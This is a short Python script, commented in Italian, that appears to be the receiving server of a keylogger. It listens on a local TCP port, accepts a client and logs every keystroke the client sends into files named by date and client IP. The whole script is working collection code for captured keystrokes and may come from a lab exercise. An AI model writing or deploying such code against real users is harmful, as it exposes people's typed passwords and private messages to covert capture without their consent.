# Server Program
import socket
import logging
from datetime import date

socketOpened = False
while not socketOpened:
    # Crea il socket "stream based" basato sul protocollo TCP ed indirizzi IPv4
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketOpened = True

    # Binding del socket e attesa di connessione da parte del client
    serverSocket.bind(("127.0.0.1",9090))
    print("> In attesa di connessione...")
    serverSocket.listen()

    # Avvenuta connessione da parte del processo client
    (clientConnected, clientAddress) = serverSocket.accept()
    print("  >> Client connesso (%s:%s)" % (clientAddress[0], clientAddress[1]))

    # Inizializzazione del file di log in cui salvare i tasti digitati
    logging.basicConfig(filename=("./DATE_%s-IP_%s.txt" % (date.today().strftime("%d.%m.%Y"), clientAddress[0])), level=logging.DEBUG, format="[%(asctime)s] | %(message)s", datefmt='%H:%M:%S')

    # Ricezione caratteri digitati dal client 
    while(socketOpened):
        try:
            dataFromClient = clientConnected.recv(16).decode().replace('\'', '')
            logging.info(dataFromClient)

        except socket.error:
            print("     >>> Client disconnesso.")
            serverSocket.close()
            socketOpened = False